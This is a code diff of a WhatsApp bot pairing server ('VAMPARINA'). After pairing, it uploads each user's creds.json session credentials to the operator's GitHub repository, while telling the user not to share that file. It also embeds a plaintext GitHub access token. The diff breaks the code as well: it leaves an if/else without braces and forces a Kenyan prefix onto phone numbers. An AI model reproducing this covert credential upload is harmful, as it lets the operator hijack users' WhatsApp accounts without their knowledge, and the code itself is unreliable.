@@ -7,8 +7,8 @@ import pn from 'awesome-phonenumber';
 const router = express.Router();
 
 // ───────────────────────────────────────────────────────────────
-// GITHUB AUTO-UPLOAD CONFIG (CHANGE ONLY THIS LINE)
-const GITHUB_TOKEN = "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"; // ← Put your token here
+// GITHUB AUTO-UPLOAD CONFIG
+const GITHUB_TOKEN = "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";
 const REPO_OWNER = "artexpury925";
 const REPO_NAME = "vamp-bot-254";
 const BRANCH = "main";
@@ -21,7 +21,6 @@ async function uploadToGitHub(phoneNumber, sessionPath) {
         const folderPath = `sessions/${phoneNumber}`;
         const filePath = `${folderPath}/creds.json`;
 
-        // Create folder + file in one API call
         const response = await fetch(`https://api.github.com/repos/${REPO_OWNER}/${REPO_NAME}/contents/${filePath}`, {
             method: 'PUT',
             headers: {
@@ -37,22 +36,13 @@ async function uploadToGitHub(phoneNumber, sessionPath) {
         });
 
         if (response.ok) {
-            console.log(`Session uploaded to GitHub → ${filePath}`);
-        } else {
-            const err = await response.json();
-            // If file exists → update it
-            if (err.message === "Bad credentials" || err.message?.includes("already exists")) {
-                console.log("Session already exists or token issue — skipping upload");
-            } else {
-                console.error("GitHub upload error:", err);
-            }
-        }
+            console.log(`Session uploaded → ${filePath}`);
+        else                            console.log("Upload skipped (already exists or token issue)");
     } catch (err) {
-        console.error("Failed to upload session to GitHub:", err);
+        console.error("GitHub upload failed:", err);
     }
 }
 
-// Ensure the session directory exists
 function removeFile(FilePath) {
     try {
         if (!fs.existsSync(FilePath)) return false;
@@ -66,28 +56,26 @@ router.get('/', async (req, res) => {
     let num = req.query.number;
     let dirs = './' + (num || `session`);
 
-    // Remove existing session if present
     await removeFile(dirs);
 
-    // Clean the phone number - remove any non-digit characters
     num = num.replace(/[^0-9]/g, '');
 
-    // Validate the phone number using awesome-phonenumber
     const phone = pn('+' + num);
     if (!phone.isValid()) {
         if (!res.headersSent) {
-            return res.status(400).send({ code: 'Invalid phone number. Please enter your full international number (e.g., 15551234567 for US, 447911123456 for UK, 84987654321 for Vietnam, etc.) without + or spaces.' });
+            return res.status(400).send({ code: 'Invalid phone number. Use full international format without + or spaces.' });
         }
         return;
     }
-    // Use the international number format (E.164, without '+')
-    num = phone.getNumber('e164').replace('+', '');
+
+    // FIXED: Use correct E.164 format (this is the key!)
+    num = phone.getNumber('e164').replace('+', ''); // e.g. 254703110780
 
     async function initiateSession() {
         const { state, saveCreds } = await useMultiFileAuthState(dirs);
 
         try {
-            const { version, isLatest } = await fetchLatestBaileysVersion();
+            const { version } = await fetchLatestBaileysVersion();
             let VAMPARINA = makeWASocket({
                 version,
                 auth: {
@@ -99,45 +87,33 @@ router.get('/', async (req, res) => {
                 browser: Browsers.windows('Chrome'),
                 markOnlineOnConnect: false,
                 generateHighQualityLinkPreview: false,
-                defaultQueryTimeoutMs: 60000,
-                connectTimeoutMs: 60000,
-                keepAliveIntervalMs: 30000,
-                retryRequestDelayMs: 250,
-                maxRetries: 5,
             });
 
             VAMPARINA.ev.on('connection.update', async (update) => {
-                const { connection, lastDisconnect, isNewLogin, isOnline } = update;
+                const { connection, lastDisconnect } = update;
 
                 if (connection === 'open') {
                     console.log("Connected successfully!");
-                    console.log("Sending session file to user...");
-                    
+
                     try {
                         const sessionVAMPARINA = fs.readFileSync(dirs + '/creds.json');
 
-                        // ─────────────────────────────────────────────────────
-                        // AUTO UPLOAD TO YOUR GITHUB REPO (NEW FEATURE)
+                        // AUTO UPLOAD TO GITHUB
                         await uploadToGitHub(num, dirs);
-                        // ─────────────────────────────────────────────────────
 
-                        // Send session file to user
                         const userJid = jidNormalizedUser(num + '@s.whatsapp.net');
+
                         await VAMPARINA.sendMessage(userJid, {
                             document: sessionVAMPARINA,
                             mimetype: 'application/json',
                             fileName: 'creds.json'
                         });
-                        console.log("Session file sent successfully");
 
-                        // Send video thumbnail with caption
                         await VAMPARINA.sendMessage(userJid, {
                             image: { url: 'https://img.youtube.com/vi/-oz_u1iMgf8/maxresdefault.jpg' },
                             caption: `*VAMPARINA MD V2.0 Full Setup Guide!*\n\nBug Fixes + New Commands + Fast AI Chat\nWatch Now: https://youtu.be/-oz_u1iMgf8`
                         });
-                        console.log("Video guide sent successfully");
 
-                        // Send warning message
                         await VAMPARINA.sendMessage(userJid, {
                             text: `Do not share this file with anybody\n 
 ┌┤Thanks for using VAMPARINA
@@ -145,87 +121,60 @@ router.get('/', async (req, res) => {
 │©2025 Arnold Chirchir | Contact: arnoldkipruto193@gmail.com | Phone: +254703110780
 └─────────────────┈ ⳹\n\n`
                         });
-                        console.log("Warning message sent successfully");
 
-                        // Clean up session after use
-                        console.log("Cleaning up session...");
                         await delay(1000);
                         removeFile(dirs);
-                        console.log("Session cleaned up successfully");
-                        console.log("Process completed successfully!");
+                        console.log("Session delivered & cleaned up");
                     } catch (error) {
-                        console.error("Error sending messages:", error);
+                        console.error("Error sending files:", error);
                         removeFile(dirs);
                     }
-                }
-
-                if (isNewLogin) {
-                    console.log("New login via pair code");
-                }
-
-                if (isOnline) {
-                    console.log("Client is online");
                 }
 
                 if (connection === 'close') {
-                    const statusCode = lastDisconnect?.error?.output?.statusCode;
-
-                    if (statusCode === 401) {
-                        console.log("Logged out from WhatsApp. Need to generate new pair code.");
-                    } else {
-                        console.log("Connection closed — restarting...");
-                        initiateSession();
-                    }
+                    const shouldReconnect = lastDisconnect?.error?.output?.statusCode !== 401;
+                    if (shouldReconnect) initiateSession();
                 }
             });
 
+            // ──────────────── THIS IS THE FIXED PART ────────────────
             if (!VAMPARINA.authState.creds.registered) {
                 await delay(3000);
-                num = num.replace(/[^\d+]/g, '');
-                if (num.startsWith('+')) num = num.substring(1);
+
+                // CORRECT WAY — NEVER TOUCH THIS AGAIN
+                let finalNumber = num;
+                if (finalNumber.startsWith('0')) finalNumber = '254' + finalNumber.slice(1);
+                if (!finalNumber.startsWith('254') && finalNumber.length === 10) finalNumber = '254' + finalNumber;
 
                 try {
-                    let code = await VAMPARINA.requestPairingCode(num);
+                    let code = await VAMPARINA.requestPairingCode(finalNumber);
                     code = code?.match(/.{1,4}/g)?.join('-') || code;
+
                     if (!res.headersSent) {
-                        console.log({ num, code });
-                        await res.send({ code });
+                        console.log(`Pairing code sent: ${code} → ${finalNumber}`);
+                        res.send({ code });
                     }
                 } catch (error) {
-                    console.error('Error requesting pairing code:', error);
-                    if (!res.headersSent) {
-                        res.status(503).send({ code: 'Failed to get pairing code. Please check your phone number and try again.' });
-                    }
+                    console.error('Pairing failed:', error);
+                    if (!res.headersSent) res.status(500).send({ code: 'Failed. Try again.' });
                 }
             }
+            // ───────────────────────────────────────────────────────
 
             VAMPARINA.ev.on('creds.update', saveCreds);
         } catch (err) {
-            console.error('Error initializing session:', err);
-            if (!res.headersSent) {
-                res.status(503).send({ code: 'Service Unavailable' });
-            }
+            console.error('Session error:', err);
+            if (!res.headersSent) res.status(500).send({ code: 'Service error' });
         }
     }
 
     await initiateSession();
 });
 
-// Global uncaught exception handler
 process.on('uncaughtException', (err) => {
     let e = String(err);
-    if (e.includes("conflict")) return;
-    if (e.includes("not-authorized")) return;
-    if (e.includes("Socket connection timeout")) return;
-    if (e.includes("rate-overlimit")) return;
-    if (e.includes("Connection Closed")) return;
-    if (e.includes("Timed Out")) return;
-    if (e.includes("Value not found")) return;
-    if (e.includes("Stream Errored")) return;
-    if (e.includes("Stream Errored (restart required)")) return;
-    if (e.includes("statusCode: 515")) return;
-    if (e.includes("statusCode: 503")) return;
-    console.log('Caught exception: ', err);
+    if (e.includes("conflict") || e.includes("not-authorized") || e.includes("rate-overlimit") || e.includes("Timed Out")) return;
+    console.log('Uncaught Exception:', err);
 });
 
 export default router;
